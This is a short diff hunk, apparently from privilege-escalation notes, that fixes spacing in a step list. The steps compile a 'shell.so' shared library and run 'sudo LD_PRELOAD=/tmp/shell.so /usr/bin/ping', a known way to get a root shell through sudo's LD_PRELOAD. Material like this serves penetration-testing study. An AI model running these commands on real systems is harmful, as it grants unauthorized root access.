@@ -112,7 +112,7 @@ Important point be in tmp/ folder to run this
 
 2. gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
-3.sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
+3. sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
 
 
 
